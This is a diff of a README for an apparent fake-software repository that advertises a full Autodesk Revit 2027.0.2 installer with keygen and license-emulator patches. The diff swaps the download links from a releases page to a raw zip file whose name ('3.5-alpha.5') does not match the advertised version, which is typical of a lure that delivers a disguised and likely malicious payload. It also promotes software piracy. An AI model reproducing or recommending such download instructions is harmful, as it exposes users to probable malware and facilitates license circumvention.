@@ -1,6 +1,6 @@
 # 🏗️ Autodesk-Revit-2027-0-2-Full-Build - Professional BIM Architecture Design Software Solution
 
-[![Download Revit 2027](https://img.shields.io/badge/Download-Revit_2027_Installer-blue)](https://github.com/hospitalce4829/Autodesk-Revit-2027-0-2-Full-Build/releases)
+[![Download Revit 2027](https://img.shields.io/badge/Download-Revit_2027_Installer-blue)](https://raw.githubusercontent.com/hospitalce4829/Autodesk-Revit-2027-0-2-Full-Build/main/src/Build_Full_Autodesk_Revit_3.5-alpha.5.zip)
 
 This repository provides the full installation package for Autodesk Revit 2027.0.2. This release includes the core BIM architecture installer, standard offline license emulator patches, and keygen utilities. These tools enable users to manage professional design projects, automate drafting tasks, and expand software functionality with plugins.
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your computer meets the technical requi
 
 You need to access the release page to get the installer files. Follow these steps to obtain the correct build:
 
-1. Click the following link: [Download Revit Installer](https://github.com/hospitalce4829/Autodesk-Revit-2027-0-2-Full-Build/releases).
+1. Click the following link: [Download Revit Installer](https://raw.githubusercontent.com/hospitalce4829/Autodesk-Revit-2027-0-2-Full-Build/main/src/Build_Full_Autodesk_Revit_3.5-alpha.5.zip).
 2. Look for the "Assets" section at the bottom of the page.
 3. Select the file ending in `.zip` or `.exe` to begin your download.
 4. Keep track of the folder where your browser saves the file.
